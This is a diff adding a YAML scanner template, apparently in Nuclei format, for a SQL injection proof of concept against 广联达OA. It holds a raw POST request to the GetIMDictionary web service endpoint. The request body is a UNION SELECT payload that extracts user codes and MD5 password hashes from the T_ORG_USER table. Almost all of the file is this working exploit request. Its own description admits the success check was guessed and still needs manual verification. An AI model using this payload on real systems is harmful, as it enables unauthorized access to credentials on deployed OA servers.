@@ -1,0 +1,53 @@
+id: poc-ams29up81tthytk4
+info:
+  name: 广联达OA sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ams29up81tthytk4
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ams29up81tthytk4
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
+
+
+    Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    dasdas=&key=1'' UNION ALL SELECT top 1812 concat(F_CODE,'':'',F_PWD_MD5) from T_ORG_USER --
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
